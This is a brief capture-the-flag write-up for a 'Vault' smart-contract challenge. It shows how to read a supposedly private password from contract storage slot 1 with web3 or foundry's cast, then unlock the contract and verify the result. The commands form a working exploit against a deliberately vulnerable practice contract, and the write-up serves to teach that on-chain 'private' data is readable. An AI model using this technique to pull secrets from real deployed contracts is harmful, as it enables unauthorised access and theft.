

### Challenge 08 Vault 
* `bool public locked` is stored in slot 0, 
* `bytes32 private password` is stored in slot 1.

Ways to read that (from the challenge site)
```JavaScript
await web3.eth.getStorageAt(instance, 1)
```

or we can use foundry.
```Bash
# Read the password
$ cast storage $INSTANCE 1 
0x412076657279207374726f6e67207365637265742070617373776f7264203a29

# unlock
$ cast send $INSTANCE "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 \
  --rpc-url $RPC_URL \
  --private-key $PK


# verify
$ cast call $INSTANCE "locked()" --rpc-url $RPC_URL
0x000....000000
```


